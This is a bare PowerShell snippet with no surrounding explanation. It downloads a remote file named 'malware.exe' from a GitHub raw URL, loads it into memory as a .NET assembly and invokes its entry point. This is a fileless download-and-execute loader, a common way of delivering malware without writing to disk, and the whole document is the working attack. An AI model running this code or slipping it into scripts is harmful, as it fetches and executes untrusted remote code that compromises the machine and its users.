    $url = "https://raw.githubusercontent.com/zecaurubuu/euu/6163e0a65bb0db448f614302a7f32a829360967c/malware.exe"
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
    [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)
